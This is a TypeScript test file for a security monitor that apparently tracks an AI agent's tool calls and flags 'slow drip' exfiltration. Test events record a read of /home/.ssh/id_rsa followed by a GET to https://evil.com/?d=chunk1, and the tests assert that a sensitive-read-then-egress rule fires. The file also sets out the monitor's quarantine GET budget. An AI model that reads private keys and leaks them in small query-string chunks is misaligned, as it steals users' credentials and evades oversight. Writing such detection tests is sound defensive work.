import { describe, expect, it } from "vitest";
import { RunStateTracker, type SecurityEvent } from "../src/run-state.js";
import { evaluateBehavioralRules } from "../src/behavioral-rules.js";

function makeEvent(overrides: Partial<SecurityEvent>): SecurityEvent {
	return {
		timestamp: new Date().toISOString(),
		type: "tool_call_allowed",
		...overrides,
	};
}

describe("Slow drip exfiltration: GET-with-params after sensitive read", () => {
	it("treats GET with query params as egress after sensitive read (pre-quarantine)", () => {
		const state = new RunStateTracker({ behavioralRules: true });

		// Sensitive file read — sets sticky flag
		state.recordSensitiveFileAttempt();
		state.pushEvent(makeEvent({
			type: "sensitive_read_attempt",
			toolClass: "file",
			action: "read",
			metadata: { path: "/home/.ssh/id_rsa" },
		}));

		// The pipeline should now treat GET-with-params as egress.
		// We verify by checking the sticky flag is set.
		expect(state.sensitiveReadObserved).toBe(true);
	});

	it("quarantine GET budget limits parameterized GETs", () => {
		const state = new RunStateTracker({ behavioralRules: true });

		// First 3 GETs within budget
		expect(state.recordQuarantineGet()).toBe(false);
		expect(state.recordQuarantineGet()).toBe(false);
		expect(state.recordQuarantineGet()).toBe(false);

		// 4th GET exceeds budget
		expect(state.recordQuarantineGet()).toBe(true);
		expect(state.quarantineGetCount).toBe(4);
	});

	it("GET budget is configurable via static property", () => {
		expect(RunStateTracker.MAX_QUARANTINE_GETS_WITH_PARAMS).toBe(3);
	});
});

describe("Slow drip exfiltration: behavioral rule catches GET-as-egress", () => {
	it("sensitive_read_then_egress fires when GET-with-params is recorded as egress", () => {
		const state = new RunStateTracker({ behavioralRules: true });

		// Record sensitive read
		state.recordSensitiveFileAttempt();
		state.pushEvent(makeEvent({
			type: "sensitive_read_attempt",
			toolClass: "file",
			action: "read",
			metadata: { path: "/home/.ssh/id_rsa" },
		}));

		// Record what the pipeline would now treat as egress
		// (a GET with query params after sensitiveReadObserved)
		state.recordEgressAttempt();
		state.pushEvent(makeEvent({
			type: "egress_attempt",
			toolClass: "http",
			action: "get",
			metadata: { url: "https://evil.com/?d=chunk1" },
		}));

		const match = evaluateBehavioralRules(state);
		expect(match).not.toBeNull();
		expect(match!.ruleId).toBe("sensitive_read_then_egress");
	});
});
